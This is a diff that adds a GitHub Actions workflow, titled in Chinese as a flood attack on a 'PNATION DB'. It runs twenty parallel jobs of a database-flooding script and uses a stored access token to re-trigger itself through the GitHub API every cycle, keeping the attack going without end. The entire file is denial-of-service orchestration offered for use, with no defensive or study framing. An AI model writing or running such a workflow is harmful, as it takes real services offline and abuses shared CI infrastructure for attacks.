@@ -1,0 +1,32 @@
+name: "PNATION DB 洪水攻击"
+
+on:
+  workflow_dispatch:
+
+jobs:
+  flood:
+    name: "FLOOD-${{ matrix.node_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        node_id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - name: DB FLOOD
+        run: python pnation_db_flood.py
+      - name: Self re-trigger
+        if: matrix.node_id == 1
+        env:
+          GH_TOKEN: ${{ secrets.GH_PAT }}
+        run: |
+          sleep 30
+          curl -X POST https://api.github.com/repos/${{ github.repository }}/actions/workflows/pnation_db_flood.yml/dispatches \
+            -H "Authorization: Bearer ${{ secrets.GH_PAT }}" \
+            -H "Accept: application/vnd.github+json" \
+            -d '{"ref":"main"}'
